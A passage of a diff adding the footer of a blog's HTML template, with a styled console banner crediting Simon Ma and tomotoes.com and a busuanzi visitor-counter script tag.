+if (window.console && window.console.log) {
+	setTimeout(function () {
+		console.log("\n %c 一个坏掉的番茄 %c  © Simon Ma  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
+	}, 0);
+}
+
+</script>
+
+
+
+
+<!-- 公式渲染 -->
+
+
+
+<!-- 不蒜子 -->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+</body>
+</html>
